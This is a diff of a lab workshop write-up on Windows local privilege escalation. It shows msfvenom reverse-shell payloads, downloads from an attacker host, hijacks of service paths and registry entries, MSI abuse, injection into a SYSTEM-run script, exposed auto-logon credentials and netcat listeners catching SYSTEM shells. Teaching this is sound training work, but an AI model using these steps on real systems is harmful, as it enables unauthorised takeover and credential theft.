@@ -39,13 +39,17 @@ The first thing we see is a Modifiable Service:
  
 So we create an executable to get our new elevated shell:
  
-````msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > daclservicehijack.exe````
+````
+msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > daclservicehijack.exe
+````
 
 <b>You notice the format is exe-service so that we don't immediately lose our shell on service start.</b>
 
 Then we transfer over the service file using our download logic again:
 
-````(New-Object System.Net.WebClient).DownloadFile("http://YOURIPHERE/daclservicehijack.exe", "C:\Users\user\Downloads\daclservicehijack.exe")````
+````
+(New-Object System.Net.WebClient).DownloadFile("http://YOURIPHERE/daclservicehijack.exe", "C:\Users\user\Downloads\daclservicehijack.exe")
+````
 
 Then we modify the binpath of the service:
 
@@ -57,7 +61,8 @@ PS C:\Users\user\Downloads> sc.exe config daclsvc binpath= "C:\Users\user\Downlo
 
 Then we query to make sure our changes were successful:
 
-````PS C:\Users\user\Downloads> sc.exe qc daclsvc
+````
+PS C:\Users\user\Downloads> sc.exe qc daclsvc
 [SC] QueryServiceConfig SUCCESS
 
 SERVICE_NAME: daclsvc
@@ -75,14 +80,16 @@ PS C:\Users\user\Downloads>
 
 Then we start the service:
 
-````PS C:\Users\user\Downloads> net start daclsvc
+````
+PS C:\Users\user\Downloads> net start daclsvc
 The DACL Service service is starting.
 ````
 
 
 Then we immediately get a shell as NT\Authority system:
 
-````root@kali:~/LPEWorkshop# nc -lvnp 31337
+````
+root@kali:~/LPEWorkshop# nc -lvnp 31337
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::31337
 Ncat: Listening on 0.0.0.0:31337
@@ -105,7 +112,8 @@ C:\Windows\system32>
 
 Next up let's tackle modifiable service binaries.
 
-````=== Modifiable Service Binaries ===
+````
+=== Modifiable Service Binaries ===
 
   Name             : filepermsvc
   DisplayName      : File Permissions Service
@@ -119,7 +127,8 @@ Next up let's tackle modifiable service binaries.
  
  First let's verify the permissions on that file.
  
- ````PS C:\Program Files\File Permissions Service> icacls.exe *.exe
+ ````
+ PS C:\Program Files\File Permissions Service> icacls.exe *.exe
 filepermservice.exe Everyone:(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)
@@ -133,7 +142,8 @@ We can see that everyone has full control: Everyone:(F).
 
 So let's use msfvenom to generate a service binary that we can use to replace that vulnerable service:
 
-````root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LHOST=YOURIPHERE LPORT=31337 -f exe-service > filepermservice.exe
+````
+root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LHOST=YOURIPHERE LPORT=31337 -f exe-service > filepermservice.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
@@ -146,7 +156,8 @@ Note that we have to name it the same thing as the original service.
 So now we replace the original service: (Note, if the service is running, it's difficult to replace this binary. This means that you could have a startup script that would try to swap the binaries before the service started but otherwise, you are out of luck. Luckily for us, the service is NOT running.)
 
 Check the service one more time:
-````PS C:\Users\user\Downloads> sc.exe qc filepermsvc
+````
+PS C:\Users\user\Downloads> sc.exe qc filepermsvc
 [SC] QueryServiceConfig SUCCESS
 
 SERVICE_NAME: filepermsvc
@@ -164,13 +175,15 @@ PS C:\Users\user\Downloads>
 
 Then we start the service:
 
-````PS C:\Users\user\Downloads> net start filepermsvc
+````
+PS C:\Users\user\Downloads> net start filepermsvc
 The File Permissions Service service is starting.
 PS C:\Users\user\Downloads> 
 ````
 
 We get a reverse shell as the NT\SYSTEM user:
-````root@kali:~/LPEWorkshop# nc -lvnp 31337
+````
+root@kali:~/LPEWorkshop# nc -lvnp 31337
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::31337
 Ncat: Listening on 0.0.0.0:31337
@@ -193,7 +206,8 @@ Next let's look at "Always install elevated"
 
 From SharpUp we see: 
 
-````=== AlwaysInstallElevated Registry Keys ===
+````
+=== AlwaysInstallElevated Registry Keys ===
 
   HKLM:    1
   HKCU:    1
@@ -204,7 +218,8 @@ From SharpUp we see:
   To exploit this we just need to run an .msi installer.
   
   We generate the payload:
-  ````root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=10.22.6.122 -f msi > Install.msi
+  ````
+  root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=10.22.6.122 -f msi > Install.msi
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
@@ -219,7 +234,8 @@ Then we transfer the payload to the victim machine:
 
 Then when we run the install, we will get a reverse shell as NT\Authority System
 
-````root@kali:~/LPEWorkshop# nc -lvnp 31337
+````
+root@kali:~/LPEWorkshop# nc -lvnp 31337
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::31337
 Ncat: Listening on 0.0.0.0:31337
@@ -240,14 +256,16 @@ Next let's look at AutoRuns:
 
 From SharpUp:
 
-````=== Modifiable Registry Autoruns ===
+````
+=== Modifiable Registry Autoruns ===
 
   HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : C:\Program Files\Autorun Program\program.exe
   ````
   
 This means that we can replace the binary in that location with our malicious binary, and the next time an Administrator logs in, we will get an Administrator shell. This is an unreliable privesc and something that is more suited to persistence. We use msfvenom to generate the payload and then transfer it to the box.
 
-````PS C:\Users\user\Downloads> (New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/program.exe", "C:\Program Files\Autorun Program\program.exe")
+````
+PS C:\Users\user\Downloads> (New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/program.exe", "C:\Program Files\Autorun Program\program.exe")
 PS C:\Users\user\Downloads> dir C:\Progra~1\"Autorun Program"
 
 
@@ -331,7 +349,8 @@ We transfer Seatbelt.exe over to the machine and see this for services:
  
  If we look at the last one listed (ignoring the obvious name) we see that the PathName is missing quotes around the name. This can be an issue that will lead to privilege escalation IF we can control any piece of the path with a space along the way. If you do not quote the path to a service binary, Windows assumes you want to try to execute the binary at every stop along the directory path. Windows assumes you are passing arguments to a binary at the stops along the way. So the example above shows us that there are 3 stops along the way that could lead to execution. Let's take a look at this:
  
- ````C:\Program SPACE Files\Unquoted SPACE Path Service\Common SPACE Files\unquotedpathservice.exe
+ ````
+ C:\Program SPACE Files\Unquoted SPACE Path Service\Common SPACE Files\unquotedpathservice.exe
  ````
  
  Every place that SPACE appears, is a place that we could put a binary and hope that it gets executed. In order in the path we could put:
@@ -401,7 +420,8 @@ This means that if we create an executable named Common.exe, we can get a revers
 
 So, we create the binary: 
 
-````msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > Common.exe
+````
+msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > Common.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
@@ -411,7 +431,8 @@ Final size of exe-service file: 15872 bytes
 
 Then we start our handler to catch the reverse shell:
 
-````root@kali:~/LPEWorkshop# nc -lvnp 31337
+````
+root@kali:~/LPEWorkshop# nc -lvnp 31337
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::31337
 Ncat: Listening on 0.0.0.0:31337
@@ -441,7 +462,8 @@ Then we start the service:
 
 Then we get a reverse shell as the NT\Authority System user:
 
-````root@kali:~/LPEWorkshop# nc -lvnp 31337
+````
+root@kali:~/LPEWorkshop# nc -lvnp 31337
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::31337
 Ncat: Listening on 0.0.0.0:31337
@@ -460,7 +482,8 @@ C:\Windows\system32>
 
 While digging through Seatbelt: we find that there are registry auto-login settings: This gives us the local user credentials.
 
-````=== Registry Auto-logon Settings ===
+````
+=== Registry Auto-logon Settings ===
 
   DefaultUserName         : user
   DefaultPassword         : password321
@@ -474,7 +497,8 @@ Developers LOVE to comment their code and scripts. So if we find a writable dire
 
 Because this is contrived, it will be a little easier to identify. Let's talk about other things though. If we read through some code/script that looks like it should be run frequently (cleanup, provision) we can assume some privileged user is running that script. We can inject our logic into that script and try to privilege escalation. These are also a FANTASTIC place to find credentials. Lazy sysadmins LOVE to put credentials in their scripts to eliminate the chance of error. If it "just works" then it's better for everyone.
 
-````PS C:\DevTools> ls
+````
+PS C:\DevTools> ls
 
 
     Directory: C:\DevTools
@@ -490,7 +514,8 @@ PS C:\DevTools>
 
 We can see there is a Cleanup script in the folder. Let's take a look at what it does.
 
-````PS C:\DevTools> Get-Content Cleanup.ps1
+````
+PS C:\DevTools> Get-Content Cleanup.ps1
 #This script is run every 5 minutes to clean up the dev tools directory.
 #This will make sure all of your .txt files get cleaned up. It's running as SYSTEM to make sure permissions are NOT an issue
 Remove-Item "C:\DevTools\*.txt"
@@ -519,7 +544,8 @@ Then we wait.
 
 Now we see we have a Powershell reverse shell as NT\Authority System
 
-````root@kali:~/LPEWorkshop# nc -lvnp 31337
+````
+root@kali:~/LPEWorkshop# nc -lvnp 31337
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::31337
 Ncat: Listening on 0.0.0.0:31337
@@ -553,7 +579,8 @@ These are some quick checks we can do to audit services.
 
 So let's look at one of the services that was listed as non-standard and start from the top.
 
-````  Name             : regsvc
+````  
+Name             : regsvc
   DisplayName      : Insecure Registry Service
   Company Name     : 
   Description      : 
@@ -566,7 +593,8 @@ So let's look at one of the services that was listed as non-standard and start f
   
   Let's check our permissions on the service:
   
-  ````PS C:\Program Files> icacls.exe "Insecure Registry Service"
+  ````
+  PS C:\Program Files> icacls.exe "Insecure Registry Service"
 Insecure Registry Service NT SERVICE\TrustedInstaller:(I)(F)
                           NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                           NT AUTHORITY\SYSTEM:(I)(F)
@@ -583,7 +611,8 @@ We can see that we can't write to that folder, or delete it.
 
 What about the binary itself?
 
-````PS C:\Program Files\Insecure Registry Service> icacls.exe *
+````
+PS C:\Program Files\Insecure Registry Service> icacls.exe *
 insecureregistryservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                             BUILTIN\Administrators:(I)(F)
                             BUILTIN\Users:(I)(RX)
@@ -615,7 +644,8 @@ PS C:\Users\user\Downloads>
 Bingo! We have full control of the registry key for that service.
 
 So now we create our payload:
-````root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > insecureregistryservice.exe
+````
+root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > insecureregistryservice.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
@@ -628,13 +658,15 @@ Now we transfer that file to a location we control:
 
 Then we modify the registry key:
 
-````PS C:\Users\user\Downloads> reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\user\Downloads\insecureregistryservice.exe /f
+````
+PS C:\Users\user\Downloads> reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\user\Downloads\insecureregistryservice.exe /f
 The operation completed successfully.
 
 PS C:\Users\user\Downloads> 
 ````
 Then we start the service:
-````PS C:\Users\user\Downloads> net start regsvc
+````
+PS C:\Users\user\Downloads> net start regsvc
 The Insecure Registry Service service is starting.
 PS C:\Users\user\Downloads> 
 ````
